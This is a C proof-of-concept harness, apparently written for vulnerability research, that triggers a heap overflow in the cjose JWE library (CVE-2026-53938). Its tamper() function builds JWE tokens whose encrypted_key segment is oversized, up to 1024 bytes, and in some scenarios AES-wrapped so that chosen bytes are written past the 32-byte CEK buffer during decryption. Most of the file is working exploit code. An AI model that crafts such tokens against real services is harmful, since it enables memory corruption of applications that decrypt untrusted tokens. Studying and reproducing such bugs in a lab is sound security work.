/*
 * cjose2shell direct-call harness (GHSA-75r7-f5cv-g3wj / CVE-2026-53938).
 *
 * Builds a real compact JWE with the upstream A128KW/A128CBC-HS256 test key,
 * replaces the encrypted_key segment with an attacker-sized base64url blob,
 * then calls the real cjose_jwe_import() and cjose_jwe_decrypt() entry points.
 * The internal header is included ONLY for lab instrumentation of cek/cek_len;
 * the overflow itself happens inside the pinned upstream AES_unwrap_key call.
 * No socket, server, application, wire listener, pointer control or command.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <cjose/cjose.h>
#include <cjose/base64.h>
#include <cjose/error.h>
#include <openssl/aes.h>
#include <openssl/crypto.h>

/* lab instrumentation: pinned internal layout, from src/<tree>/src/include/jwe_int.h */
#include "include/jwe_int.h"

/* upstream v0.6.2.4 test/check_jwe.c:58-59 (JWK_OCT_16) */
static const char *JWK_OCT_16 = "{\"kty\":\"oct\", "
                                "\"k\":\"3921VrO5TrLvPQ-NFLlghQ\"}";

/* raw key bytes of the base64url k above, for the independent expected transform */
static const unsigned char KEK[16] = {
    0xdf, 0xdd, 0xb5, 0x56, 0xb3, 0xb9, 0x4e, 0xb2,
    0xef, 0x3d, 0x0f, 0x8d, 0x14, 0xb9, 0x60, 0x85
};
#define CEK_LEN 32 /* _cjose_jwe_set_cek_aes_cbc(), A128CBC-HS256 */

static char *tamper(const char *compact, size_t ek_len, int valid_wrap)
{
    cjose_err err;
    memset(&err, 0, sizeof(err));
    uint8_t blob[1024];
    if (ek_len > sizeof(blob)) return NULL;
    if (valid_wrap) {
        /* RFC 3394 wrap of an oversized "CEK" under the lab KEK, so OpenSSL's
         * key unwrap succeeds and writes exactly these chosen bytes out. */
        unsigned char pt[1016];
        memset(pt, 0x5a, sizeof(pt));
        memcpy(pt + CEK_LEN, "MISHE-OOB", 9);
        AES_KEY wkey;
        AES_set_encrypt_key(KEK, 128, &wkey);
        if (AES_wrap_key(&wkey, NULL, blob, pt, ek_len - 8) <= 0) return NULL;
    } else
        memset(blob, 0x41, ek_len);
    char *b64 = NULL;
    size_t b64_len = 0;
    if (!cjose_base64url_encode(blob, ek_len, &b64, &b64_len, &err)) return NULL;

    const char *d1 = strchr(compact, '.');
    const char *d2 = d1 ? strchr(d1 + 1, '.') : NULL;
    if (!d2) return NULL;
    size_t head = (size_t)(d1 - compact);
    size_t tail = strlen(d2); /* includes the leading '.' */
    char *out = (char *)malloc(head + 1 + b64_len + tail + 1);
    if (!out) return NULL;
    memcpy(out, compact, head);
    out[head] = '.';
    memcpy(out + head + 1, b64, b64_len);
    memcpy(out + head + 1 + b64_len, d2, tail);
    out[head + 1 + b64_len + tail] = '\0';
    cjose_get_dealloc()(b64);
    return out;
}

int main(int argc, char **argv)
{
    const char *scenario = (argc > 1) ? argv[1] : "valid";
    setbuf(stdout, NULL); /* crash runs must retain already-printed status */
    int valid_wrap = 0;
    size_t ek_len = 0;
    if (!strcmp(scenario, "valid")) ek_len = CEK_LEN + 8;
    else if (!strcmp(scenario, "odd")) ek_len = CEK_LEN + 8 + 1;      /* OpenSSL rejects odd length */
    else if (!strcmp(scenario, "probe")) ek_len = CEK_LEN + 8 + 8;    /* 8 bytes past, invalid IV */
    else if (!strcmp(scenario, "attack")) ek_len = 1024;              /* 984 bytes past, invalid IV */
    else if (!strcmp(scenario, "wrapped")) { ek_len = CEK_LEN + 8 + 8; valid_wrap = 1; }
    else if (!strcmp(scenario, "wrappedbig")) { ek_len = 1024; valid_wrap = 1; }
    else if (!strcmp(scenario, "undersized")) ek_len = CEK_LEN;       /* unwrap rejects */
    else { printf("BAD_SCENARIO=%s\n", scenario); return 2; }

    cjose_err err;
    memset(&err, 0, sizeof(err));
    cjose_jwk_t *jwk = cjose_jwk_import(JWK_OCT_16, strlen(JWK_OCT_16), &err);
    if (!jwk) { printf("JWK_FAIL=%d\n", err.code); return 2; }

    cjose_header_t *hdr = cjose_header_new(&err);
    cjose_header_set(hdr, CJOSE_HDR_ALG, CJOSE_HDR_ALG_A128KW, &err);
    cjose_header_set(hdr, CJOSE_HDR_ENC, CJOSE_HDR_ENC_A128CBC_HS256, &err);
    const char *plain = "Setec Astronomy";
    cjose_jwe_t *good = cjose_jwe_encrypt(jwk, hdr, (const uint8_t *)plain, strlen(plain), &err);
    if (!good) { printf("ENCRYPT_FAIL=%d\n", err.code); return 2; }
    char *compact = cjose_jwe_export(good, &err);
    if (!compact) { printf("EXPORT_FAIL=%d\n", err.code); return 2; }

    char *token = (char *)compact;
    if (strcmp(scenario, "valid") != 0) {
        token = tamper(compact, ek_len, valid_wrap);
        if (!token) { printf("TAMPER_FAIL\n"); return 2; }
    }
    printf("TOKEN_SEGMENTS=5 SCENARIO=%s EK_LEN=%zu\n", scenario, ek_len);

    cjose_jwe_t *jwe = cjose_jwe_import(token, strlen(token), &err);
    printf("IMPORT=%d ERRCODE=%d\n", jwe != NULL, err.code);
    if (!jwe) return 3;
    size_t raw_len = jwe->to[0].enc_key.raw_len;
    printf("CEK_LEN_BEFORE=%zu EK_RAW_LEN=%zu\n", jwe->cek_len, raw_len);

    /* Independent transform: what the library's AES_unwrap_key will write,
     * computed in lab memory so expected bytes can be compared with the heap. */
    unsigned char inbuf[2048], outbuf[2048];
    memset(inbuf, 0, sizeof(inbuf));
    memset(outbuf, 0, sizeof(outbuf));
    int unwrap_rc = 0;
    if (raw_len && raw_len <= sizeof(inbuf)) {
        AES_KEY akey;
        AES_set_decrypt_key(KEK, 128, &akey);
        memcpy(inbuf, jwe->to[0].enc_key.raw, raw_len);
        unwrap_rc = AES_unwrap_key(&akey, NULL, outbuf, inbuf, raw_len);
    }
    /* OpenSSL writes raw_len-8 transformed bytes into out before its IV check;
     * the return code is <=0 for our non-RFC-conformant blob. */
    int expected = (raw_len >= 8) ? (int)(raw_len - 8) : 0;
    printf("EXPECTED_WRITE_LEN=%d UNWRAP_RC=%d EXPECTED_BYTE32=%02x\n",
           expected, unwrap_rc, expected > CEK_LEN ? outbuf[CEK_LEN] : 0);

    size_t plain_len = 0;
    memset(&err, 0, sizeof(err));
    uint8_t *dec = cjose_jwe_decrypt(jwe, jwk, &plain_len, &err);
    printf("DECRYPT=%d ERRCODE=%d PLAIN_LEN=%zu\n", dec != NULL, err.code, plain_len);
    printf("CEK_LEN_AFTER=%zu\n", jwe->cek_len);

    /* Lab instrumentation reads only within the declared 32-byte CEK; bytes
     * past it are inspected by gdb at the unwrap boundary (see PROVENANCE.md). */
    if (jwe->cek && expected > CEK_LEN) {
        size_t mismatches = 0;
        for (size_t i = 0; i < CEK_LEN; i++)
            if (jwe->cek[i] != outbuf[i]) mismatches++;
        printf("CEK_CMP_LEN=%d MISMATCHES=%zu\n", CEK_LEN, mismatches);
    } else {
        printf("CEK_CMP_LEN=0 MISMATCHES=0\n");
    }

    if (dec) cjose_get_dealloc()(dec);
    cjose_jwe_release(jwe);
    if (token != compact) free(token);
    cjose_get_dealloc()(compact);
    cjose_header_release(hdr);
    cjose_jwe_release(good);
    cjose_jwk_release(jwk);
    return 0;
}
